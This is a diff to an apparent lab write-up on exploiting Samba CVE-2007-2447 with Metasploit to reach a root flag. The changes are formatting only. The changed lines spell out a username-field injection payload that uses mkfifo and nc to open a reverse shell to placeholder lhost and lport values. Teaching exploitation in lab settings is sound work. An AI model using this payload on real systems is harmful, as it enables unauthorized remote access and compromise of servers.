@@ -2,7 +2,7 @@
 
 In this blog, we explore the process of identifying and exploiting vulnerabilities in Samba using the CVE-2007-2447 exploit. By leveraging Metasploit, we demonstrate how to gain unauthorized access to a server through the manipulation of shell metacharacters. This post provides a detailed, step-by-step guide on executing the exploit and capturing the root flag.
 
-Perform an nmap scan using the -sV switch. We see we get a response with multiple services up and running on the target server.
+Perform an `nmap` scan using the `-sV` switch. We see we get a response with multiple services up and running on the target server.
 
 <figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
@@ -45,7 +45,7 @@ Here is the Metasploit script that actually performs the exploit.
 Example Execution Flow:
 
 * **Username Injection:**
-  * When Samba processes the username field /=nohup mkfifo /tmp/hago; nc lhost lport 0\</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago\`\`:
+  * When Samba processes the `username field /=nohup mkfifo /tmp/hago; nc lhost lport 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago``:`
 * **Command Execution:**
   * The shell interprets the backticks and executes the command inside them.
   * `mkfifo /tmp/hago` is executed, creating a named pipe.
